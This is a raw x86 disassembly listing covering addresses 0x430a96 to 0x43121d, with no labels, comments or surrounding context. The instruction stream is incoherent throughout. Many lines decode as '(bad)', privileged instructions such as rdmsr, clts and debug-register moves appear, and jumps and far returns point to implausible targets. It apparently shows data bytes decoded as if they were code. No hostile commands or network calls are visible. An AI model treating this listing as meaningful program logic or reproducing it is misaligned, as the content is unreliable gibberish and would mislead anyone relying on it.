  430a96:	cmp    edi,DWORD PTR [edi]
  430a98:	ja     0x430a36
  430a9a:	mov    eax,edi
  430a9c:	mov    esp,0x458567a8
  430aa1:	clc    
  430aa2:	mov    eax,DWORD PTR [ebp-0x8]
  430aa5:	mov    eax,ebx
  430aa7:	in     al,dx
  430aa8:	retf   
  430aa9:	ret    
  430aaa:	into   
  430aab:	mov    dh,0x7d
  430aae:	scas   eax,DWORD PTR es:[edi]
  430aaf:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  430ab5:	add    BYTE PTR [ebx],ch
  430ab7:	jmp    0xba0bf7
  430abc:	mov    eax,DWORD PTR [ebp-0x5c]
  430abf:	mov    eax,DWORD PTR [ebp-0x14]
  430ac2:	inc    ebp
  430ac3:	enter  0x458b,0xf8
  430ac7:	xor    eax,ebx
  430ac9:	add    ecx,ebx
  430acb:	cmp    ecx,esi
  430acd:	shufps xmm7,xmm4,0xaf
  430ad1:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430ad7:	dec    ebp
  430ad8:	sub    esi,DWORD PTR [ebx]
  430ada:	cmp    esi,DWORD PTR [ebx]
  430adc:	ja     0x430ae1
  430ade:	mov    eax,DWORD PTR [ebx]
  430ae0:	lods   al,BYTE PTR ds:[esi]
  430ae1:	mov    db0,ecx
  430ae4:	inc    ebp
  430ae5:	dec    ebp
  430ae6:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430aec:	retf   
  430aed:	rol    dh,1
  430aef:	or     al,0xce
  430af1:	inc    ebp
  430af2:	scas   eax,DWORD PTR es:[edi]
  430af3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430af9:	add    BYTE PTR [ebx],ch
  430afb:	add    BYTE PTR [ebx],bh
  430afd:	inc    ebp
  430afe:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430b04:	inc    ebp
  430b05:	retf   
  430b06:	mov    ecx,esi
  430b08:	clc    
  430b09:	(bad)  
  430b0a:	retf   
  430b0b:	scas   eax,DWORD PTR es:[edi]
  430b0c:	ret    
  430b0d:	mov    ecx,esi
  430b0f:	hlt    
  430b10:	(bad)  
  430b11:	push   ebp
  430b12:	scas   eax,DWORD PTR es:[edi]
  430b13:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430b19:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  430b1f:	add    BYTE PTR [ebx],al
  430b21:	mov    eax,eax
  430b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b24:	inc    ebp
  430b25:	dec    ebp
  430b26:	xor    DWORD PTR [ebx],esi
  430b28:	pushf  
  430b29:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  430b2f:	rdmsr  
  430b31:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  430b39:	sar    eax,1
  430b3b:	rol    BYTE PTR [ebp+0x5],1
  430b3e:	xor    eax,DWORD PTR [ebp+0x3]
  430b41:	jmp    0x430b2e
  430b43:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430b49:	xor    eax,DWORD PTR [ebp+0x33]
  430b4c:	mov    eax,DWORD PTR [ebx]
  430b4e:	rol    BYTE PTR [ebx],1
  430b50:	test   BYTE PTR [edi],cl
  430b52:	fwait
  430b53:	shl    DWORD PTR [edx],0x4d
  430b56:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  430b5c:	xor    edx,eax
  430b5e:	add    eax,DWORD PTR ds:0xeb4d45e0
  430b64:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  430b6a:	add    BYTE PTR [ebx],dh
  430b6c:	inc    ebp
  430b6d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  430b73:	rdpmc  
  430b75:	rol    DWORD PTR [ebx],0x4d
  430b78:	loopne 0x430b05
  430b7a:	push   ebp
  430b7b:	in     al,dx
  430b7c:	mov    cl,dl
  430b7e:	adc    eax,edx
  430b80:	jb     0x430b87
  430b82:	add    BYTE PTR [ebp+0x45],al
  430b85:	jmp    0x430b12
  430b87:	mov    ebx,eax
  430b89:	test   al,0xcb
  430b8b:	dec    ebp
  430b8c:	dec    ebp
  430b8d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  430b93:	add    ebx,DWORD PTR [ebx-0x743ecdf1]
  430b99:	dec    ebp
  430b9a:	mov    al,0x8b
  430b9c:	dec    ebp
  430b9d:	in     al,dx
  430b9e:	xor    edx,ecx
  430ba0:	xor    edx,eax
  430ba2:	add    eax,DWORD PTR [ebp+0x3]
  430ba5:	jbe    0x430bb6
  430ba7:	mov    eax,ecx
  430ba9:	test   al,0x45
  430bab:	dec    ebp
  430bac:	mov    DWORD PTR [ebx],esi
  430bae:	loopne 0x430be3
  430bb0:	inc    ebp
  430bb1:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  430bb7:	rol    esi,0x45
  430bba:	scas   eax,DWORD PTR es:[edi]
  430bbb:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  430bc1:	mov    eax,ecx
  430bc3:	hlt    
  430bc4:	dec    ebp
  430bc5:	inc    ebp
  430bc6:	mov    eax,edi
  430bc8:	loopne 0x430ba2
  430bca:	retf   
  430bcb:	test   esi,ecx
  430bcd:	clc    
  430bce:	scas   eax,DWORD PTR es:[edi]
  430bcf:	inc    ebp
  430bd0:	mov    eax,edi
  430bd2:	fdiv   st,st(0)
  430bd4:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430bda:	fwait
  430bdb:	xor    esi,DWORD PTR [edx]
  430bdd:	pushf  
  430bde:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  430be4:	inc    esi
  430be6:	mov    ebp,DWORD PTR [eax-0x10]
  430be9:	inc    ebp
  430bea:	dec    ebp
  430beb:	xor    esi,DWORD PTR [ebx]
  430bed:	add    eax,DWORD PTR [ebx]
  430bef:	loopne 0x430c00
  430bf1:	dec    ebp
  430bf2:	ror    DWORD PTR [edx+0x7233084d],0x3
  430bf9:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430bff:	lock fwait
  430c01:	ret    
  430c02:	xor    al,BYTE PTR [ebp-0x77]
  430c05:	mov    esi,esp
  430c07:	rol    BYTE PTR [ebp-0x7c],1
  430c0a:	xor    ebx,DWORD PTR [ebx-0x7772cd47]
  430c10:	call   edi
  430c12:	enter  0x4d45,0x8b
  430c16:	mov    esi,eax
  430c18:	fmul   st(3),st
  430c1a:	push   ebp
  430c1b:	dec    ebp
  430c1c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430c22:	ret    0xc19b
  430c25:	xor    al,BYTE PTR [esi-0x280276]
  430c2b:	dec    ebp
  430c2c:	jne    0x430c61
  430c2e:	mov    eax,DWORD PTR [ebx]
  430c30:	cld    
  430c31:	loopne 0x430be3
  430c33:	push   ebp
  430c34:	add    DWORD PTR [eax+0x72851100],ecx
  430c3a:	inc    DWORD PTR [eax]
  430c3c:	inc    DWORD PTR [ebp-0x75]
  430c3f:	mov    edi,esp
  430c41:	lock add bl,0x1
  430c45:	retf   
  430c46:	add    dh,al
  430c48:	xor    dh,cl
  430c4a:	inc    ebp
  430c4b:	scas   eax,DWORD PTR es:[edi]
  430c4c:	mov    eax,DWORD PTR [ebx]
  430c4e:	shl    al,0x0
  430c51:	inc    ebp
  430c52:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430c58:	call   0x461f90
  430c5d:	ud0    eax,ecx
  430c60:	adc    al,0x4d
  430c62:	inc    ebp
  430c63:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430c69:	lock push 0x338055
  430c6f:	add    eax,DWORD PTR [eax]
  430c71:	ud0    ecx,edx
  430c74:	sbb    BYTE PTR [ebp+0x5e],dl
  430c77:	xor    ecx,ecx
  430c79:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430c80:	push   ecx
  430c81:	add    BYTE PTR [ebp-0x38],cl
  430c84:	mov    DWORD PTR [esi-0x740004],eax
  430c8a:	cld    
  430c8b:	inc    ebp
  430c8c:	jmp    0x430c19
  430c8e:	mov    esp,esp
  430c90:	mov    ebx,eax
  430c92:	mov    eax,esi
  430c94:	clc    
  430c95:	scas   eax,DWORD PTR es:[edi]
  430c96:	icebp  
  430c97:	mov    esi,DWORD PTR [ebp-0x28]
  430c9a:	(bad)  
  430c9b:	retf   
  430c9c:	or     ecx,eax
  430c9e:	(bad)  
  430c9f:	dec    ebp
  430ca0:	pop    es
  430ca1:	(bad)  
  430ca2:	(bad)  
  430ca3:	or     BYTE PTR [esi],al
  430ca5:	jb     0x430c6d
  430ca7:	add    BYTE PTR [ebx],al
  430ca9:	inc    ebp
  430caa:	(bad)  
  430cab:	mov    ecx,DWORD PTR [edx]
  430cad:	fadd   st(6),st
  430caf:	ret    
  430cb0:	add    ah,BYTE PTR [ebp-0x37]
  430cb3:	int    0x55
  430cb5:	sub    ebp,esp
  430cb7:	add    edx,DWORD PTR [ecx-0x14]
  430cba:	inc    ebp
  430cbb:	inc    ebp
  430cbc:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430cc2:	cld    
  430cc3:	(bad)  
  430cc4:	(bad)  
  430cc5:	scas   eax,DWORD PTR es:[edi]
  430cc6:	loopne 0x430d03
  430cc8:	mov    DWORD PTR [edi],ecx
  430cca:	mov    ebp,ebp
  430ccc:	clc    
  430ccd:	push   eax
  430ccf:	push   DWORD PTR [ebp-0x4]
  430cd2:	mov    BYTE PTR [ebp+0xa],0xff
  430cd6:	(bad)  
  430cd7:	int3   
  430cd8:	or     BYTE PTR [eax],al
  430cda:	(bad)  
  430cdb:	lea    eax,[edi]
  430cdd:	ins    BYTE PTR es:[edi],dx
  430cde:	(bad)  
  430cdf:	inc    DWORD PTR [ecx]
  430ce1:	push   eax
  430ce2:	mov    BYTE PTR [ebp+0x9],0x8b
  430ce6:	leave  
  430ce7:	les    edx,FWORD PTR [ebp+0x0]
  430cea:	in     al,dx
  430ceb:	call   DWORD PTR [ecx-0x75]
  430cee:	inc    ebp
  430cef:	cld    
  430cf0:	mov    DWORD PTR [eax+0x8b01fc],eax
  430cf6:	cld    
  430cf7:	xor    BYTE PTR [eax-0x76a8f98b],bh
  430cfd:	pop    es
  430cfe:	mov    eax,DWORD PTR [eax]
  430d00:	clc    
  430d01:	test   eax,esi
  430d03:	je     0x430d7a
  430d05:	mov    eax,esi
  430d07:	cld    
  430d08:	add    al,0x80
  430d0a:	add    WORD PTR [ecx+0x0],ax
  430d0e:	fiadd  DWORD PTR [eax]
  430d10:	mov    BYTE PTR [eax],0x3d
  430d13:	push   0xffffffc3
  430d15:	push   edi
  430d16:	mov    edx,DWORD PTR [eax+0x51]
  430d19:	pop    edi
  430d1a:	lea    ebx,[ebx-0x8]
  430d1d:	ret    0x45
  430d20:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d26:	xchg   eax,edi
  430d28:	mov    DWORD PTR [ebp-0x75],ecx
  430d2b:	push   esi
  430d2c:	clc    
  430d2d:	jne    0x430cff
  430d2f:	mov    ecx,0xf8450b0b
  430d34:	(bad)  
  430d35:	push   cs
  430d36:	or     BYTE PTR [ebp-0x3a],dh
  430d39:	cmp    eax,DWORD PTR [ecx]
  430d3b:	pop    esi
  430d3c:	(bad)  
  430d3d:	or     al,0x5
  430d3f:	inc    eax
  430d40:	leave  
  430d41:	jmp    0x40cf:0x25564204
  430d48:	leave  
  430d49:	in     eax,dx
  430d4a:	inc    DWORD PTR [eax-0x75]
  430d4d:	fimul  DWORD PTR [ebx-0x228139be]
  430d53:	inc    eax
  430d54:	nop
  430d55:	loopne 0x430d56
  430d57:	ret    
  430d58:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d5e:	add    eax,0xff45e8f8
  430d63:	push   esi
  430d64:	push   DWORD PTR [ebp-0x39]
  430d67:	mov    eax,0x7edda46
  430d6c:	or     al,0x6
  430d6e:	push   DWORD PTR [ebp-0x3a]
  430d71:	cmp    eax,DWORD PTR [edx]
  430d73:	pop    esi
  430d74:	ret    
  430d75:	or     al,0x56
  430d77:	inc    ecx
  430d78:	push   ebp
  430d79:	jle    0x430d67
  430d7b:	inc    edx
  430d7c:	inc    ebp
  430d7d:	int    0x1
  430d7f:	inc    ecx
  430d80:	sub    BYTE PTR ds:0xe77541fc,ah
  430d86:	add    DWORD PTR [edx+0x1c],eax
  430d89:	retf   0xc38b
  430d8c:	adc    al,0x8b
  430d8e:	xchg   edx,eax
  430d8f:	push   ecx
  430d90:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d96:	rcl    DWORD PTR [esi-0x9],cl
  430d99:	jne    0x430deb
  430d9b:	mov    eax,0x7c80ece
  430da0:	rol    DWORD PTR [esi],cl
  430da2:	div    DWORD PTR [ebp+0x50]
  430da5:	cmp    ecx,edx
  430da7:	pop    esi
  430da8:	dec    BYTE PTR [edx]
  430daa:	in     al,dx
  430dab:	inc    edx
  430dac:	sub    esp,ecx
  430dae:	inc    eax
  430daf:	(bad)  
  430db0:	push   eax
  430db1:	add    edx,DWORD PTR [eax-0x1f]
  430db4:	push   edi
  430db5:	add    dh,dh
  430db7:	leave  
  430db8:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430dbc:	add    BYTE PTR [ecx+0x0],dl
  430dbf:	inc    ebp
  430dc0:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430dc6:	add    BYTE PTR [eax-0x7fbf448],bh
  430dcc:	add    al,0x2
  430dce:	jmp    0x57eb928
  430dd3:	jne    0x430dbd
  430dd5:	mov    eax,DWORD PTR [edx]
  430dd7:	or     BYTE PTR [eax],al
  430dd9:	inc    ecx
  430dda:	stc    
  430ddb:	in     eax,dx
  430ddc:	ss inc eax
  430dde:	aas    
  430ddf:	out    0x7d,eax
  430de1:	inc    ecx
  430de2:	mov    ebp,ecx
  430de4:	lock ret 0x7d
  430de8:	and    ecx,DWORD PTR [ebx-0x171777]
  430dee:	add    bh,bh
  430df0:	aad    0xd7
  430df2:	add    dh,cl
  430df4:	clts   
  430df6:	(bad)  
  430df7:	call   0xffce0cfc
  430dfc:	hlt    
  430dfd:	iret   
  430dfe:	jge    0x430dd6
  430e00:	rol    DWORD PTR [esi-0x80],cl
  430e03:	jmp    0x1c5d10
  430e08:	out    dx,al
  430e09:	mov    eax,DWORD PTR [ebx]
  430e0b:	(bad)  
  430e0c:	pop    esi
  430e0d:	push   es
  430e0e:	cmp    al,0xe8
  430e10:	sar    edi,0x8
  430e13:	inc    DWORD PTR [edi]
  430e15:	inc    esi
  430e16:	(bad)  
  430e17:	loopne 0x430e97
  430e19:	push   edi
  430e1a:	push   cs
  430e1b:	push   ebx
  430e1c:	add    BYTE PTR [ebx+0x24008b56],cl
  430e22:	add    BYTE PTR [ebp+0x50],al
  430e25:	push   eax
  430e26:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e2c:	sub    edx,DWORD PTR [esi-0x24]
  430e2f:	jne    0x430de7
  430e31:	lods   eax,DWORD PTR ds:[esi]
  430e32:	mov    edx,DWORD PTR [edx-0x34]
  430e35:	dec    esi
  430e36:	out    0x83,eax
  430e38:	into   
  430e39:	push   edi
  430e3b:	loopne 0x430e0b
  430e3d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430e41:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430e48:	rol    DWORD PTR [edx],0x8
  430e4b:	mov    esp,ecx
  430e4d:	cmp    DWORD PTR [ebx],0xc
  430e50:	mov    esi,0x5001c0
  430e55:	push   eax
  430e56:	push   cs
  430e57:	push   eax
  430e58:	(bad)  
  430e59:	sub    edx,edi
  430e5b:	push   esi
  430e5c:	adc    al,0xcb
  430e5e:	ins    DWORD PTR es:[edi],dx
  430e5f:	mov    eax,0x203e8
  430e64:	add    al,ah
  430e66:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430e6d:	add    dh,al
  430e6f:	add    ah,ch
  430e71:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430e77:	pop    ecx
  430e78:	or     eax,ebx
  430e7a:	cli    
  430e7b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430e81:	lea    ebp,[ebx]
  430e83:	mov    edx,DWORD PTR [edx-0x4]
  430e86:	dec    ecx
  430e87:	inc    ebp
  430e88:	shr    BYTE PTR [ebx],0x4b
  430e8b:	and    al,0x0
  430e8d:	(bad)  
  430e8e:	jne    0x430ed5
  430e90:	pop    eax
  430e91:	mov    al,0x5a
  430e93:	call   0x14210f2
  430e98:	and    al,0x85
  430e9a:	push   edx
  430e9b:	add    BYTE PTR [eax+eax*1+0x0],ah
  430e9f:	dec    ebp
  430ea0:	mov    cl,0x23
  430ea2:	jmp    0x430e90
  430ea4:	mov    al,0xe7
  430ea6:	call   0x1391194
  430eab:	shr    DWORD PTR [eax+ebx*2],cl
  430eae:	lock (bad) 
  430eb0:	adc    eax,0x757f008d
  430eb5:	out    0x58,eax
  430eb7:	cmp    al,0x7
  430eb9:	pop    edx
  430eba:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430ec1:	push   ecx
  430ec2:	cld    
  430ec3:	mov    esi,0x3b0175
  430ec8:	and    al,0xb0
  430eca:	xor    BYTE PTR [edx+0x1],0x8b
  430ece:	add    ah,bh
  430ed0:	mov    edi,DWORD PTR [ebp-0x4]
  430ed3:	psubsw mm7,QWORD PTR [edi]
  430ed6:	add    DWORD PTR [ebp+0x0],ebp
  430ed9:	rcr    eax,1
  430edb:	mov    edi,ecx
  430edd:	and    eax,DWORD PTR [eax]
  430edf:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430ee5:	call   0x13011ce
  430eea:	add    al,cl
  430eec:	mov    ebp,esi
  430eee:	aam    0x83
  430ef0:	or     DWORD PTR [ecx],eax
  430ef2:	jne    0x430ee5
  430ef4:	mov    eax,DWORD PTR [eax]
  430ef6:	aam    0x0
  430ef8:	dec    ebp
  430ef9:	jne    0x430e86
  430efb:	cmp    ebx,eax
  430efd:	jb     0x430f4c
  430eff:	jmp    0x430e8c
  430f01:	mov    ebx,esp
  430f03:	int3   
  430f04:	dec    ebp
  430f05:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430f0c:	mov    edx,0x8b0a8b
  430f11:	cmp    ecx,DWORD PTR [eax]
  430f13:	jb     0x430eec
  430f15:	pop    edx
  430f16:	push   edi
  430f17:	cli    
  430f18:	pop    es
  430f19:	mov    eax,ecx
  430f1b:	jb     0x430f1f
  430f1d:	add    DWORD PTR [ebx],0xa
  430f20:	mov    eax,DWORD PTR [ebx]
  430f22:	int3   
  430f23:	add    bh,BYTE PTR [esi+0x75d10006]
  430f29:	jmp    0x430eb6
  430f2b:	mov    al,0xe8
  430f2d:	call   0x10411af
  430f32:	add    edx,DWORD PTR [ecx+ecx*8]
  430f35:	pop    edi
  430f36:	or     BYTE PTR [ecx-0x73],bl
  430f39:	pop    ecx
  430f3a:	inc    edi
  430f3b:	xor    al,0xeb
  430f3d:	push   ecx
  430f3e:	mov    edi,DWORD PTR [edx+0xc506cc]
  430f44:	call   0xb21049
  430f49:	int3   
  430f4a:	sbb    BYTE PTR [esi],ch
  430f4c:	inc    ebp
  430f4d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430f53:	call   0x9c11c2
  430f58:	or     BYTE PTR [ebx-0x73],dl
  430f5b:	cmp    al,0x47
  430f5d:	mov    al,0x1
  430f5f:	jb     0x430f61
  430f61:	mov    al,0x10
  430f63:	push   eax
  430f64:	add    al,0x75
  430f66:	add    BYTE PTR [ebx],ch
  430f68:	add    ebx,esp
  430f6a:	int3   
  430f6b:	jne    0x430f7d
  430f6d:	movsx  edx,cl
  430f70:	add    DWORD PTR [eax],eax
  430f72:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430f79:	mov    gs,edi
  430f7b:	add    BYTE PTR [eax-0x50],ch
  430f7e:	add    al,ch
  430f80:	mov    eax,DWORD PTR [ecx]
  430f82:	sub    eax,DWORD PTR [eax]
  430f84:	jb     0x430ffb
  430f86:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430f8a:	jge    0x430f74
  430f8c:	add    al,0x1
  430f8e:	add    DWORD PTR [eax],0x0
  430f91:	jne    0x430f93
  430f93:	je     0x430fda
  430f95:	mov    eax,DWORD PTR [edi]
  430f97:	ror    BYTE PTR [ebp+0x4d],1
  430f9a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430fa1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430fa7:	mov    DWORD PTR [ebx],ebp
  430fa9:	fadd   DWORD PTR [eax+0x75]
  430fac:	inc    eax
  430fad:	pop    eax
  430fae:	lea    ebx,[ecx+0x4f]
  430fb1:	push   0xb1000003
  430fb6:	out    dx,eax
  430fb7:	add    ebp,DWORD PTR [edx+edx*2]
  430fba:	add    BYTE PTR [ebx+ecx*4],bh
  430fbd:	mov    ch,BYTE PTR [ebx]
  430fbf:	jb     0x431033
  430fc1:	add    al,0x89
  430fc3:	push   eax
  430fc4:	call   0x842b5d36
  430fc9:	add    DWORD PTR [eax+eax*1],eax
  430fcc:	jae    0x430fe2
  430fce:	icebp  
  430fcf:	inc    ebp
  430fd0:	mov    eax,DWORD PTR gs:[ecx]
  430fd3:	int3   
  430fd4:	out    dx,al
  430fd5:	loopne 0x431024
  430fd7:	sub    eax,DWORD PTR [edx]
  430fd9:	push   0xffffff83
  430fdb:	pop    esi
  430fdc:	push   cs
  430fdd:	jl     0x430ff8
  430fdf:	add    al,0xaf
  430fe1:	xor    eax,0x832b6d00
  430fe6:	mov    eax,DWORD PTR [edx]
  430fe8:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430fee:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ff4:	inc    ebp
  430ff5:	shr    ebx,0x3
  430ff8:	or     DWORD PTR [eax],0x4
  430ffb:	push   0xffffffa5
  430ffd:	pop    esi
  430ffe:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431005:	jmp    0x431064
  431007:	mov    edi,0xff0272
  43100c:	fdivr  QWORD PTR [ebp+0x5d]
  43100f:	push   0x4e
  431011:	pop    ecx
  431012:	call   0x435417
  431017:	mov    DWORD PTR [ebx],eax
  431019:	in     al,0xc8
  43101b:	rol    BYTE PTR [ebp-0x75],0xc1
  43101f:	call   0xad1200
  431024:	pop    esi
  431025:	enter  0xceff,0x8b
  431029:	repz mov ecx,DWORD PTR [ebp-0x34]
  43102d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  431034:	je     0x431036
  431036:	or     DWORD PTR [ebx-0x74183b24],eax
  43103c:	jne    0x431022
  43103e:	jmp    0x431039
  431040:	push   DWORD PTR [edx-0x24]
  431043:	push   0x4d
  431045:	pop    ecx
  431046:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  43104a:	jge    0x431052
  43104c:	mov    eax,eax
  43104e:	sub    ebp,DWORD PTR [edx+0x24]
  431051:	pop    esi
  431052:	inc    ebp
  431053:	mov    esp,0x8b6077
  431058:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  43105e:	lods   al,BYTE PTR ds:[esi]
  43105f:	add    BYTE PTR [ebx],bh
  431061:	enter  0xce73,0x49
  431065:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  43106d:	stc    
  43106e:	jge    0x4310e2
  431070:	jnp    0xdd4293df
  431076:	call   0xc6114c
  43107b:	fadd   st(0),st
  43107d:	dec    esi
  43107e:	ins    BYTE PTR es:[edi],dx
  43107f:	stc    
  431080:	cmp    al,0x73
  431082:	push   ebp
  431083:	mov    eax,0xf8028b
  431088:	jne    0x43104b
  43108a:	mov    esi,ecx
  43108c:	mov    esp,DWORD PTR [ebp+0x2c]
  43108f:	add    edi,DWORD PTR [ebp-0x24]
  431092:	sub    esp,eax
  431094:	and    al,0x45
  431096:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  43109c:	sbb    al,0xee
  43109e:	pop    esi
  43109f:	call   0x8310cf
  4310a4:	fsubr  st,st(3)
  4310a6:	sti    
  4310a7:	add    BYTE PTR gs:[ecx],bh
  4310aa:	add    eax,esp
  4310ac:	add    DWORD PTR [esi],eax
  4310ae:	rol    DWORD PTR [ebp+0x8],0x29
  4310b2:	mov    esp,eax
  4310b4:	clc    
  4310b5:	jne    0x43112c
  4310b7:	mov    eax,0x8b0673
  4310bc:	loopne 0x431103
  4310be:	loopne 0x431049
  4310c0:	lods   al,BYTE PTR ds:[esi]
  4310c1:	int3   
  4310c2:	inc    ebp
  4310c3:	mov    DWORD PTR gs:[eax+edi*8],eax
  4310c7:	add    al,0xc3
  4310c9:	sub    ecx,DWORD PTR [ebp+0x47]
  4310cc:	(bad)  
  4310ce:	shr    BYTE PTR [ebp-0x1f],0xe8
  4310d2:	add    eax,DWORD PTR [eax]
  4310d4:	call   0x644d1d9
  4310d9:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4310df:	dec    esi
  4310e0:	ins    DWORD PTR es:[edi],dx
  4310e1:	in     al,dx
  4310e2:	lea    eax,[eax]
  4310e4:	inc    ebp
  4310e5:	inc    ebp
  4310e6:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4310ec:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4310f6:	and    al,0xdc
  4310f8:	ror    DWORD PTR [edx+0x24],0xf7
  4310fc:	or     BYTE PTR [ebp+0x4c],dh
  4310ff:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431103:	stos   BYTE PTR es:[edi],al
  431104:	adc    edx,edi
  431106:	inc    esp
  431107:	add    edi,DWORD PTR [eax]
  431109:	jne    0x4310ee
  43110b:	mov    DWORD PTR [eax-0x7449db04],ecx
  431111:	cmp    ecx,DWORD PTR [edi]
  431113:	sub    BYTE PTR [ebp-0x7e],dl
  431116:	sar    ebp,0xb
  431119:	jmp    FWORD PTR [edi+0x2400392a]
  43111f:	sub    esi,DWORD PTR [ebx-0x73]
  431122:	mov    esp,DWORD PTR [ecx+edi*4]
  431125:	mov    ecx,DWORD PTR [eax]
  431127:	and    BYTE PTR [eax],al
  431129:	jne    0x4310f5
  43112b:	sub    ebp,ecx
  43112d:	sbb    BYTE PTR [esi+0x32],ah
  431130:	dec    ebp
  431131:	push   ebp
  431132:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431138:	ret    
  431139:	mov    edx,ebp
  43113b:	leave  
  43113c:	sub    DWORD PTR [esi+0x24],ebx
  43113f:	ret    0x2b
  431142:	pop    ax
  431144:	push   ebp
  431145:	rol    BYTE PTR [ebx],0xeb
  431148:	add    DWORD PTR [ecx+0x6c0001],0x40
  43114f:	jb     0x4311a6
  431151:	ret    
  431152:	in     al,dx
  431153:	jecxz  0x4310e0
  431155:	push   esi
  431156:	xchg   esp,eax
  431157:	jne    0x431159
  431159:	cmp    edx,DWORD PTR [esi+0x1c]
  43115c:	jne    0x431142
  43115e:	mov    eax,DWORD PTR [ebp-0x77]
  431161:	ror    DWORD PTR [ebx+0x899408],0xe0
  431168:	mov    esi,DWORD PTR [ebp-0x75]
  43116b:	pop    esi
  43116c:	nop
  43116d:	mov    eax,DWORD PTR [eax]
  43116f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431175:	add    al,0x0
  431177:	inc    ebp
  431178:	mov    eax,DWORD PTR [ebx]
  43117a:	mov    ebp,ebx
  43117c:	cmp    al,0xf
  43117e:	or     al,al
  431180:	inc    ebp
  431181:	inc    ebp
  431182:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431188:	cld    
  431189:	add    BYTE PTR [edi+0x546c16c0],dh
  43118f:	add    BYTE PTR [ecx-0x5],dl
  431192:	add    eax,0x17200
  431197:	sbb    al,0x85
  431199:	dec    esp
  43119a:	je     0x4311d4
  43119c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4311a0:	add    BYTE PTR [ebx],bh
  4311a2:	(bad)  
  4311a3:	and    al,0x32
  4311a5:	jae    0x431143
  4311a7:	mov    cl,cl
  4311a9:	inc    DWORD PTR [esp]
  4311ac:	push   ebp
  4311ad:	shr    esp,0x8
  4311b0:	in     al,dx
  4311b1:	push   esp
  4311b2:	add    DWORD PTR [eax],esp
  4311b4:	add    bl,cl
  4311b6:	inc    ebp
  4311b7:	mov    bh,0x89
  4311b9:	add    ah,bh
  4311bb:	jmp    0xca752105
  4311c0:	pushf  
  4311c1:	dec    esp
  4311c2:	mov    edx,0xf8178520
  4311c7:	fst    DWORD PTR [ebp+0x0]
  4311ca:	mov    BYTE PTR [eax],0xc4
  4311cd:	sub    edx,DWORD PTR [ebx-0x3f]
  4311d0:	inc    ebp
  4311d1:	add    eax,0xc601da
  4311d6:	mov    al,0xc6
  4311d9:	ins    BYTE PTR es:[edi],dx
  4311da:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4311e1:	dec    esp
  4311e2:	jmp    DWORD PTR [eax]
  4311e4:	inc    ebp
  4311e5:	fnstcw WORD PTR [esi+0x29]
  4311e8:	test   BYTE PTR [eax],0xc8
  4311eb:	rol    BYTE PTR [eax],0xc0
  4311ee:	lea    ecx,[ebp-0x3cf0dbcb]
  4311f4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4311fa:	inc    esi
  4311fb:	add    DWORD PTR [eax],ebx
  4311fd:	add    dh,bh
  4311ff:	mov    esi,DWORD PTR [edx+0x8]
  431202:	(bad)  
  431203:	fdiv   QWORD PTR ss:[ecx]
  431206:	(bad)  
  431207:	mov    bl,ch
  431209:	add    esi,eax
  43120b:	add    dh,bl
  43120d:	or     esi,eax
  43120f:	mov    dl,0xdf
  431211:	add    esi,eax
  431213:	add    al,ah
  431215:	push   cs
  431216:	mov    BYTE PTR [edx+0xc601e1],0xe2
  43121d:	or     BYTE PTR [ebx],dh
